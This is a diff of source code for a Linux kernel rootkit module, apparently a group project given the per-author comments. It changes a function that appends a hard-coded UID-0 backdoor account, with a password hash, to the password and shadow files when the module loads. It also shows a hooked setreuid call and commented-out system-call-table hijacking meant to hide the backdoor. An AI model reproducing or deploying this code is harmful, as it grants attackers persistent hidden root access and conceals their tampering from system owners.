@@ -56,7 +56,7 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 // End Brendan
 
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
-int add_backdoor(char *path) {
+void add_backdoor(char *path) {
 	
 		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
 		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
@@ -316,14 +316,16 @@ static int __init rootkit_init(void){
 	
 	// Start Marc 
 	
-	int offset;
+// 	int offset;
 	
-	offset = add_backdoor(password_file);
+	add_backdoor(password_file);
+// 	offset = add_backdoor(password_file);
 	
 // 	original_getdents = (void *)sys_call_address[offset];                        \
 //     	sys_call_address[offset] = (unsigned long*)&original_getdents;
 	
-   	offset = add_backdoor(shadow_file);
+	add_backdoor(shadow_file);
+//    	offset = add_backdoor(shadow_file);
 	
 // 	original_getdents = (void *)sys_call_address[offset];                        \
 //     	sys_call_address[offset] = (unsigned long*)&original_getdents;
